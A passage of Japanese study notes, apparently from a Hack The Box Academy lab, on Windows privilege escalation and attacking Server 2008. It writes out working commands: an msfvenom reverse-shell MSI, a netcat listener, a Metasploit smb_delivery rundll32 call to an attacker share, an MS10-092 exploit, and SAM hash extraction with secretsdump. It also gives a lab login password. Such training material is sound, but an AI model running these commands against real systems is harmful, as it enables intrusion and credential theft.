	- 悪意のあるMSIパッケージ作成 (msfvenomツールなどを使用)
		- 例: `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`
	- MSIパッケージ実行
		- コマンド: `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`
	- リバースシェルの待ち受け (netcatツールなどを使用)
		- 例: `nc -lnvp 9443`
	- SYSTEM権限での確認 (オプション)
		- コマンド: `whoami`
	- 対処法: グループポリシーで該当設定を無効化する。
- CVE-2019-1388 (証明書ダイアログの権限昇格)
	- 概要: Windows証明書ダイアログのUACバイパス脆弱性。
	- 脆弱な実行ファイル (パッチ未適用のhhupd.exeなど) を管理者として実行。
	- 証明書情報内のハイパーリンクからSYSTEM権限でブラウザを起動。
	- ブラウザの機能 (例: ページソース表示 -> 名前を付けて保存) を悪用し、SYSTEM権限でコマンドプロンプトを起動。
		- ファイル名に `c:\windows\system32\cmd.exe` を指定して実行。
	- 対処法: Microsoftが2019年11月にリリースしたパッチを適用する。
- Scheduled Tasks (タスクスケジューラ) の悪用
	- 概要: 定期実行されるタスクの設定ミスや、タスクが実行するスクリプトへの不適切なアクセス権限を利用する手法。
	- タスクの列挙 (アクセス可能な範囲のみ表示される)
		- コマンドプロンプト: `schtasks /query /fo LIST /v`
		- PowerShell: `Get-ScheduledTask | select TaskName,State`
	- 権限が緩いタスクや、タスクが実行するスクリプトファイルを発見する。
	- スクリプトファイルへの書き込み権限確認 (accesschk64.exeツールの例)
		- 例: `.\accesschk64.exe /accepteula -s -d C:\Scripts\`
	- 書き込み可能なスクリプトに悪意のあるコードを追記する。
- User/Computer Description Field (説明欄) からの情報漏洩
	- 概要: 管理者がユーザーアカウントやコンピュータの説明欄にパスワードなどの機密情報を保存している場合がある。
	- ローカルユーザーの説明欄確認 (PowerShell)
		- コマンド: `Get-LocalUser`
	- コンピュータの説明欄確認 (PowerShell)
		- コマンド: `Get-WmiObject -Class Win32_OperatingSystem | select Description`
- VHDX/VMDK ファイルのマウントと情報抽出
	- 概要: バックアップなどで見つかる仮想ディスクファイルをマウントし、OS内部のファイルにアクセスする手法。レジストリハイブからハッシュを抽出できる。
	- 仮想ディスクファイル (.vhd, .vhdx, .vmdk) を発見する。
	- Linuxでのマウント (guestmountツールを使用)
		- VMDK: `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`
		- VHD/VHDX: `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`
	- Windowsでのマウント (GUI操作、またはMount-VHD cmdletを使用)
		- PowerShell: `Mount-VHD`
	- マウントした仮想ディスク内の `C:\Windows\System32\Config` から、SAM, SECURITY, SYSTEM レジストリハイブを取得する。
	- secretsdump.py ツールなどでレジストリハイブからローカルユーザーのパスワードハッシュを抽出する。
		- コマンド: `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`
	- 対処法: 仮想ディスクファイルを含むバックアップファイルへのアクセス権限を厳格に管理する。

## Server 2008 攻撃の基本

- なぜ Server 2008 は危険か？
	- 2020年1月14日にサポートが終了 (EOL) しているため、セキュリティ更新が行われない
	- 後継バージョンと比較して、Credential Guard や Device Guard など多くのセキュリティ機能が欠けている
	- いまだに組織の古いシステム (医療、教育、自治体など) で見つかることがある
- どうやって Server 2008 の脆弱性を見つけるか？ (列挙のステップ)
	- インストール済みのパッチを確認する
		- コマンド: `wmic qfe`
	- 脆弱性を自動でチェックするツールを使う
		- 例: Sherlock (PowerShell スクリプト)
		- Sherlock 実行前の準備: `Set-ExecutionPolicy bypass -Scope process` (スクリプト実行ポリシーの一時変更)
		- Sherlock スクリプトの読み込み: `Import-Module .\Sherlock.ps1`
		- 脆弱性検索の実行: `Find-AllVulns`
		- 例: Windows-Exploit-Suggester (systeminfo コマンドの結果を利用)
	- 手動でパッチの有無やバージョンを調べて、既知の脆弱性を探す
- どうやって初期アクセスとシェルを取得するか？ (侵入のステップ)
	- Metasploit のようなフレームワークを使うのが一般的
	- 例: `smb_delivery` モジュールを使ってDLLを送り込み実行させる
	- `smb_delivery` モジュールの使い方 (Metasploit コンソールで実行):
		- モジュール検索: `search smb_delivery`
		- モジュール選択: `use 0` (検索結果の番号)
		- 設定確認: `show options`
		- ターゲット(ペイロードの種類)選択: `show targets` -> `set target 0` (DLL)
		- 攻撃元IP (LHOST) の設定 (通常は自分自身のIP): `set lhost <攻撃者IP>`
		- リバースシェルを受けるポート (LPORT) の設定: `set lport <ポート番号>`
		- 攻撃実行 (サーバー開始): `exploit`
	- ターゲットホストで実行するコマンド (Metasploitが教えてくれる): `rundll32.exe \\<攻撃者IP>\<共有名>\<ファイル名>.dll,0`
- どうやって権限を昇格させるか？ (権限昇格のステップ)
	- 見つかった脆弱性 (例: MS10-092) に対応するエクスプロイトモジュールを使う
	- 例: Metasploit の `ms10_092_schelevator` モジュール
	- `ms10_092_schelevator` モジュールの使い方 (Metasploit コンソールで実行):
		- モジュール検索: `search <CVE番号 または MSBulletin 番号>` (例: `search 2010-3338`)
		- モジュール選択: `use 0` (検索結果の番号)
		- 現在アクティブな Meterpreter セッションIDの確認と選択: `sessions` -> `sessions -i <セッションID>` -> (Meterpreterシェルに入る) -> `background` (Metasploitプロンプトに戻る) -> `set SESSION <セッションID>`
		- 注意: エクスプロイトが32ビットプロセスで動かない場合がある -> Meterpreter シェル内でプロセスの確認 (`ps`) を行い、64ビットプロセスへの移行 (`migrate <プロセスID>`) が必要な場合がある
		- 攻撃元IP (LHOST) の設定: `set lhost <攻撃者IP>`
		- リバースシェルを受けるポート (LPORT) の設定: `set lport <ポート番号>`
		- 設定確認: `show options`
		- 攻撃実行: `exploit`
	- 権限昇格が成功したか確認: Meterpreter シェル内で `getuid` コマンドや `sysinfo` コマンドを実行
- 課題への取り組み方 (RDP 接続例)
	- 提供されたターゲットシステムに接続するコマンド例: `rdesktop -u htb-student -p HTB_@cademy_stdnt! [IP Address]`
	- 提示された方法 (MS10-092) 以外の方法で権限昇格を試みる (他の脆弱性を探すなど)
	- 最終的に NT AUTHORITY\SYSTEM 権限を取得し、Administrator デスクトップ上の flag.txt ファイルを見つける